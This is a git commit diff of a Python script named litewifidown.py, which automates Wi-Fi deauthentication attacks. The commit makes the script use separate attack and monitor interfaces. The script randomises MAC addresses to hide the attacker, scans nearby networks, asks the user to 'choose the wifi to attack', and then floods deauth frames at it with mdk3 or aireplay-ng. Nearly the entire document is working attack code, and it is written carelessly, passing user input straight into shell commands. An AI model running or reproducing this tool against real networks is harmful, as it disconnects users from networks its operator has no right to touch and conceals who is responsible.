dc667eff1433bc16ac0fa57af330c2ac6e207f64
Alan Ramalho <ramalho.sit@gmail.com>
2018-11-20 02:06:14 -0200

    Update litewifidown.py

--- litewifidown.py
+++ litewifidown.py
@@ -30,15 +30,29 @@ os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > card.
 print("")
 
 
-wlancard = raw_input("Please select one Wireless extension: ")
-os.system('cat card.txt | grep -n ^ | grep '+wlancard+' | cut -d: -f2 > card.sh')
+wlancarda = raw_input("Please select one Attack extension: ")
+os.system('cat card.txt | grep -n ^ | grep '+wlancarda+' | cut -d: -f2 > carda.sh')
 print("")
-os.system('cat card.sh && echo "#############################################################"')
+os.system('cat carda.sh && echo "#############################################################"')
 os.system('clear')
 
-print("Changing the mac addrrs: ")
-os.system('card=`cat card.sh` && ifconfig $card down && macchanger -r $card && ifconfig $card up')
+print("Listing Wireless extensions: ")
+os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > card.txt && cat -n card.txt")
 print("")
+
+
+wlancardm = raw_input("Please select one Monitor extension: ")
+os.system('cat card.txt | grep -n ^ | grep '+wlancardm+' | cut -d: -f2 > cardm.sh')
+print("")
+os.system('cat cardm.sh && echo "#############################################################"')
+os.system('clear')
+
+
+print("Changing the mac addrrs: ")
+os.system('card=`cat carda.sh` &&  ifconfig $card down && macchanger -r $card && ifconfig $card up')
+os.system('card=`cat cardm.sh` &&  ifconfig $card down && macchanger -r $card && ifconfig $card up')
+print("")
+
 print("Chose the way for deauth attack: ")
 os.system('test /usr/bin/mdk3 && echo "1: [+] Mdk3 ok" || echo "1: [!] Mdk3 off"')
 os.system('test /usr/bin/aircrack-ng && echo "2: [+] Aircrack-ng ok" || echo "1: [!] Aireplay-ng off"')
@@ -49,30 +63,30 @@ os.system('clear')
 
 
 print("Detecting Wireless Networks: ")
-os.system('card=`cat card.sh` && nmcli dev wifi rescan ifname $card')
-os.system('card=`cat card.sh` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card')
+os.system('card=`cat cardm.sh` && nmcli dev wifi rescan ifname $card')
+os.system('card=`cat cardm.sh` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card')
 print("[0] to reescan")
 
 choo = int(raw_input("Choose the wifi to attack: "))
 choose=(choo+1)
 os.system('echo "'+str(choose)+'" > choose')
-os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS3 $3}' | sed '/$choose/p; d' > chan")
+os.system("card=`cat cardm.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS3 $3}' | sed '/$choose/p; d' > chan")
 print("")
 
 if way == 1:
-  os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $7}' | sed '/$choose/p; d' > targ")
-  os.system('card=`cat card.sh` && airmon-ng start $card')
+  os.system("card=`cat cardm.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $7}' | sed '/$choose/p; d' > targ")
+  os.system('card=`cat carda.sh` && airmon-ng start $card')
   
-  os.system('card=`cat card.sh`mon && target=`cat targ` && mdk3 $card d -n "$target"')
+  os.system('card=`cat carda.sh`mon && target=`cat targ` && mdk3 $card d -n "$target"')
   print("Wait..")
-  os.system('card=`cat card.sh`mon && airmon-ng stop $card')
+  os.system('card=`cat carda.sh`mon && airmon-ng stop $card')
 else:
-  os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $2}' | sed '2p; d' > targ")
-  os.system('card=`cat card.sh` && ch=`cat chan` && airmon-ng start $card $ch')
+  os.system("card=`cat cardm.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $2}' | sed '2p; d' > targ")
+  os.system('card=`cat carda.sh` && ch=`cat chan` && airmon-ng start $card $ch')
   
-  os.system('card=`cat card.sh`mon && target=`cat targ` && aireplay-ng -0 0 -a $target $card')
+  os.system('card=`cat carda.sh`mon && target=`cat targ` && aireplay-ng -0 0 -a $target $card')
   print("Wait..")
-  os.system('card=`cat card.sh`mon && airmon-ng stop $card')
+  os.system('card=`cat carda.sh`mon && airmon-ng stop $card')
   
   
   
@@ -80,4 +94,5 @@ print("")
 print("")
 print("Return configurations: ")
 os.system('rm choose && rm chan && rm card.* && rm targ')
-os.system('card=`cat card.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
+os.system('card=`cat carda.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
+os.system('card=`cat cardm.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
